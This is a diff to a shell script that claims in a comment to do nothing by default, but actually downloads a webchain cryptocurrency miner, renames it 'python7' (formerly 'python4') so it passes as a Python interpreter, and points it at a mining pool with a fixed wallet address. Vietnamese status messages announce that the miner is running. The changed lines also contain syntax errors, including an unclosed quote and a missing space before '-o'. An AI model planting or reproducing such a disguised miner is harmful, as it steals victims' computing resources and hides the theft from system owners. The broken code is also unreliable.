@@ -10,23 +10,26 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python4 ]; then
-    if pgrep -x "python4" > /dev/null
+if [ -f ${PWD}/python7 ]; then
+    if pgrep -x "python7 > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python4 -o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x -worker-id 01
+./python7-o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+
+     
 fi
 exit
 fi
 
 
-wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
-tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
-mv webchain-miner python4
+wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz
+tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz
+mv webchain-miner python7
 rm config.json
-./python4 -o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x -worker-id 01
+./python7-o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+
 exit 0
